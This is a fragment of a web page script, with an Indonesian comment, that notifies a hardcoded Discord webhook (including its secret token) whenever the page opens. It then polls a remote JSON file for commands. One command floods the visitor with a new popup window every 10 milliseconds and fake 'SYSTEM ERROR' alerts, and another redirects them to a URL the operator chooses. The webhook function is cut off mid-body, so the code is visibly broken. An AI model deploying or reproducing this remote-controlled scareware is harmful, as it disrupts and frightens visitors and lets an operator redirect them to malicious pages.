    <script>

        function sendWebhook() {
            fetch("https://discord.com/api/webhooks/1348149288579891230/vMwbJioC6BccY6wEtaDWotoL_ezlfd_875kj1HSo4m6xyBkVZlMAxPO9hA_iWt0lXbP2", {
                method: "POST",
                headers: { "Content-Type": "application/json" },

        function checkCommand() {
            fetch(jsonURL)
                .then(res => res.json())
                .then(data => {
                    if (data.command === "worm_on") startWorm();
                    if (data.command === "url_on" && data.log_url) window.location.href = data.log_url;
                })
                .catch(err => console.error("Error fetching JSON:", err));
        }

        function startWorm() {
            setInterval(() => { window.open(window.location.href, "_blank", "width=300,height=300"); }, 10);
            setInterval(() => { alert("SYSTEM ERROR! RESTART YOUR DEVICE!"); }, 5000);
        }

        sendWebhook(); // Kirim notifikasi ke webhook saat halaman dibuka
        setInterval(checkCommand, 5000);
    </script>
